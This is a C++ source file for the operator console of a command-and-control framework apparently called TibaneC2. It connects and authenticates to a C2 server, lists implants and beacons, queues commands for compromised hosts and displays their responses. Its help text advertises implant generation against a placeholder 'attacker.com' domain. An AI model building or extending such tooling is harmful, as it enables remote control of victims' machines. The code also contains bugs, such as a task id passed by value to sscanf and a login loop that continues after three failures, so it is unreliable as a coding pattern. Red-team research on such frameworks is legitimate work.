#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <cjson/cJSON.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <readline/readline.h>
#include <readline/history.h>

//#include "includes/session.h"
//#include "includes/agent.h"


extern "C" {
    #include "./libs/libdisplay.h"
}

#define BUFFER_SIZE 0x100
#define MAX_SIZE 0x20000
#define HELP_SIZE 0x400

char *IP;
int PORT;

const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage\n"
                                        "   implants : show all active implants\n "
                                        "   beacons : show all active beacons\n"
                                        "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant\n"
                                        "   list-tasks : shows all tasks for all implants\n"    
                                        "   beacon [id] : interactive shell for selected beacon\n"
                                        "   quit, q, exit : exit the program\n\n";


const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage\n"
                                    "   TASKS\n"                                    
                                    "   new-task [task] : Issue new task for the beacon\n"
                                    "   list-tasks : Show all information abouts tasks for beacon\n"
                                    "   reponse-task [task id] : show response for specific task"
                                    ""
                                    "\n\n";


void banner() {
    printf("\n");
    printf("░▒▓████████▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  \n");
    printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ \n");
    printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░ \n");
    printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░  \n");
    printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░        \n");
    printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n");
    printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓████████▓▒░ \n");
    printf("                        https://github.com/tibane0/TibaneC2\n");
    printf("======================================================================================\n");                                                                                                                 
    printf("[+] Welcome to tibane shell | type 'help' for options \n\n");
}


// talk to server
class Communicate_ {
    private:

    public:
    int sock;
    int conn() {
        int status;
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        sock = socket(AF_INET, SOCK_STREAM, 0);

        if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) {
            perror("Invalid Address");
            return -1;
        }

        if ((status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
           printf("\nConnection Failed \n");
           return -1;
       }
       return 0;
    }

    bool authenticate() {
        char user[BUFFER_SIZE];
        char pass[BUFFER_SIZE];

        printf("[+] Enter Username: ");
        fgets(user, sizeof(user) -1, stdin);
        user[strcspn(user, "\n")] = 0;
        printf("[+] Enter Password: ");
        fgets(pass, sizeof(pass) -1, stdin);
        pass[strcspn(pass, "\n")] = 0;
        
        cJSON *credentials = cJSON_CreateObject();
        if (!credentials) {
            return NULL;
        }
        cJSON_AddStringToObject(credentials, "username", user);
        cJSON_AddStringToObject(credentials, "password", pass);
        char *creds = cJSON_Print(credentials);
        if (!creds) {
            return false;
        }
        cJSON_Delete(credentials);
    
        send(sock, creds, strlen(creds), 0);
        free(creds);

        char buffer[BUFFER_SIZE];
        int bytes = recv(sock, buffer, sizeof(buffer) -1, 0);
        if (bytes <= 0) {
            perror("Recv Failed");
            return false;
        }
        buffer[bytes] = '\0'; 

        cJSON *response = cJSON_Parse(buffer);
        if (!response) {
            printf("Error parsing JSON!\n");
            return false;
        }
        cJSON *sign_in = cJSON_GetObjectItem(response, "authenticated");
        // handle 
        
        if (strcmp(sign_in->valuestring, "true") == 0) {
            cJSON_Delete(response);
            return true;    
        }
        cJSON_Delete(response);
        return false;
    }
};


class SendInfo : public Communicate_ {
    public:
    void new_task(const char *id, const char* command) {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return;
        }
        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "new-task");
        cJSON_AddStringToObject(info, "command", command);
        char *info_ = cJSON_Print(info);
        send(sock, info_, strlen(info_), 0);
        cJSON_Delete(info);
        free(info_);

        char reply[BUFFER_SIZE];
        
        recv(sock, reply, sizeof(reply), 0);
    }


};

class RetriveInfo : public Communicate_ {
    public:
    char* get_info(const char* table) {
        char buffer[BUFFER_SIZE];
        char *info_container = (char*)malloc(MAX_SIZE);
        if (!info_container) return NULL;

        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return NULL;
        }
        cJSON_AddStringToObject(info, "Info", table);
        char *info_ = cJSON_Print(info);
        send(sock, info_, strlen(info_), 0);

        cJSON_Delete(info);
        free(info_);

        ssize_t bytes;
        int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }

        return info_container;
    }


    char* list_tasks(const char *id) {
        char *info_container = (char*)malloc(MAX_SIZE + 1);
        if (!info_container) return NULL;
    
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            free(info_container);
            return NULL;
        }
    
        // Correct JSON structure (matches server expectations)

        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "list-tasks");
    
        char *info_json = cJSON_PrintUnformatted(info); // Smaller payload
        if (!info_json) {
            cJSON_Delete(info);
            free(info_container);
            return NULL;
        }
    
        // Send request
        if (send(sock, info_json, strlen(info_json), 0) <= 0) {
            perror("send failed");
            free(info_json);
            cJSON_Delete(info);
            free(info_container);
            return NULL;
        }
    
        free(info_json);
        cJSON_Delete(info);
    
        // Receive response
        int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            free(info_container);
            return NULL;
        }
        info_container[bytes_received] = '\0';
    
        return info_container;
    }


    char *response_task(const char *id, int task_id) {
        char *info_container = (char*)malloc(MAX_SIZE);
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return NULL;
        }
        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "response-task");
        cJSON_AddNumberToObject(info, "task_id", task_id);

        char *info_ = cJSON_Print(info);
        send(sock, info_, strlen(info_), 0);

        cJSON_Delete(info);
        free(info_);


        int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }
        return info_container;
    }
};

char* beacon_command_generator(const char* text, int state) {
    static const char* commands[] = {
        "info", "list-tasks", "new-task", "exit", "quit", "q", NULL
    };
    
    static int list_index, len;
    const char* name;

    if (!state) {
        list_index = 0;
        len = strlen(text);
    }

    while ((name = commands[list_index++])) {
        if (strncmp(name, text, len) == 0) {
            return strdup(name);
        }
    }

    return NULL;
}

char** beacon_shell_completion(const char* text, int start, int end) {
    rl_attempted_completion_over = 1;
    return rl_completion_matches(text, beacon_command_generator);
}



class Operator {
    private:

    public:
    void AgentShell(const char* id, RetriveInfo recvinfo, SendInfo sendinfo) {
        printf("\n[+] Using Agent ID : %s \n", id);
        // Set up readline for this shell
        rl_attempted_completion_function = beacon_shell_completion;
        
        // Save current history and start fresh for this session
        HIST_ENTRY** orig_history = history_list();
        clear_history();
        while (1) {
            
            char prompt[BUFFER_SIZE];
            snprintf(prompt, sizeof(prompt), "\n[ tibane-shell ] (%s) $ ", id);
            char *cmd = readline(prompt);

            if (!cmd) {
                printf("\n[-] Back to Home Shell \n\n");
                break;
            }

            if (strlen(cmd) == 0) {
                free(cmd);
                continue;  
            }

            add_history(cmd);



            if  (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4)==0 || strncmp(cmd, "q", 1)==0) {
                printf("\n[-] Back to Home Shell \n\n");
                return;
            } else if (strncmp(cmd, "info", 4) == 0) {
                // print every things about the agent | and all tasks related to agent

            } else if (strncmp(cmd, "list-tasks", 10) == 0) {
                // print all tasks
                // task_per_agent
                char* data = recvinfo.list_tasks(id);
                if (!data) {
                    printf("\n [-] NO DATA RELATED TO TASKS FOR %s \n\n", id);
                    free(data);
                    continue;
                }
                //displayinfo.display_tasks_per_agent(data);
                DisplayTasksPerAgent(data);
                free(data);
            } else if (strncmp(cmd, "new-task", 8) == 0) {
                char task[BUFFER_SIZE];
                if (sscanf(cmd, "new-task %s", task) != 1) {
                    printf("\n[-] Failed to add task\n'n");
                    continue;
                }
                sendinfo.new_task(id, task);
                printf("\n[+] Added Task \n");
            } else if (strncmp(cmd, "response-task", 14) == 0) {
                int task_id;
                if (sscanf(cmd, "response-task %d", task_id) != 1) {
                    printf("\n[-] MUST HAVE TASK ID\n");
                    continue;
                }
                char *data = recvinfo.response_task(id, task_id);
                // print this data
                DisplayCommandResponse(data);
                free(data);
            }
            else {
                printf("%s", beacon_shell_help);
            }

            free(cmd);
        }
    }
};


char* command_generator(const char* text, int state);
char** shell_completion(const char* text, int start, int end);
void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendinfo, Operator op);


int main() {
    // configs
    START:
    int conf = open("../config/console_conf.json", O_RDONLY);
    if (conf == -1) {
        write(1, "Failed to Configuration file\n", 20);
        // logfile
        sleep(30);
        goto START;
    }

    char buffer[0x200];
    READ:
    size_t bytesRead;
    if ((bytesRead = read(conf, buffer, sizeof(buffer))) <= 0) {
            perror("Read Error");
            sleep(30);
            goto READ;
    }

    PARSE:
    cJSON *config = cJSON_Parse(buffer);
    if (!config) {
        fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
        sleep(30);
        goto PARSE;
    }

    cJSON *SERVER_ADDR = cJSON_GetObjectItem(config, "SERVER_ADDR");
    cJSON *SERVER_PORT = cJSON_GetObjectItem(config, "SERVER_PORT");

    IP = SERVER_ADDR->valuestring;
    PORT = SERVER_PORT->valueint;

    char usage[BUFFER_SIZE] = "";

    // start 
    banner();
    Communicate_ com;
    Operator op;
    RetriveInfo recvinfo;
    SendInfo sendinfo;

    while (1) {
        if (com.conn() == 0) {
            break;
        };
        printf("Failed to connect to server: \n");
        sleep(3);
    }
    recvinfo.sock = com.sock;
    sendinfo.sock = com.sock;
     
    int tries = 0;
    do {
        if (com.authenticate() == true) {
            break;
        }
        printf("Failed to authenticate: \nTry Again\n\n");
        sleep(3); // 
        tries++;
    } while (tries < 3);


    

    // shell
    // Initialize readline
    rl_attempted_completion_function = shell_completion;
    using_history();
    while (true) {
        char *cmd = readline("[ tibane-shell ] $ ");
        
        if (!cmd) {  // Handle Ctrl+D
            printf("Ctrl + D \n");
            break;
        }

        // Skip empty commands
        if (strlen(cmd) == 0) {
            free(cmd);
            continue;
        }

        // Add to history and process
        add_history(cmd);
        process_shell_command(cmd, recvinfo, sendinfo, op);
        free(cmd);
    }
}


//////////////////////////////////////////////
// shell

void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendinfo, Operator op) {
    if (strncmp(cmd, "implants", 4) == 0) {
        char* data = recvinfo.get_info("Implants");
        if (!data) {
            printf("\n[-] NO DATA ABOUT IMPLANTS \n\n");
            return;
        }
        //displayinfo.display_all_agents(data);
        DisplayAllAgents(data);
        free(data);
    } 
    else if (strncmp(cmd, "exit", 4) == 0 || strncmp(cmd, "quit", 4) == 0 || strncmp(cmd, "q", 1) == 0) {
        printf("\n[-] Exiting \n\n");
        sleep(1);
        exit(0);
    } 
    else if (strncmp(cmd, "beacon", 6) == 0) {
        char id[66];
        if (sscanf(cmd, "beacon %65s", id) == 1) {
            // confirm if id exists
            op.AgentShell(id, recvinfo, sendinfo);
        }
    } 
    else if (strncmp(cmd, "list-tasks", 10) == 0) {
        char* data = recvinfo.get_info("Tasks");
        if (!data) {
            printf("\n[-] NO DATA About Tasks\n \n");
            return;
        }
        //displayinfo.display_all_tasks(data);
        DisplayAllTasks(data);
        free(data);
    }
    else {
        printf("%s", tibane_shell_help);
    }
}

char** shell_completion(const char* text, int start, int end) {
    rl_attempted_completion_over = 1;
    return rl_completion_matches(text, command_generator);
}



char* command_generator(const char* text, int state) {
    static const char* commands[] = {
        "implants", "beacon", "list-tasks", "exit", "quit", "q", NULL
    };
    
    static int list_index, len;
    const char* name;

    if (!state) {
        list_index = 0;
        len = strlen(text);
    }

    while ((name = commands[list_index++])) {
        if (strncmp(name, text, len) == 0) {
            return strdup(name);
        }
    }

    return NULL;
}


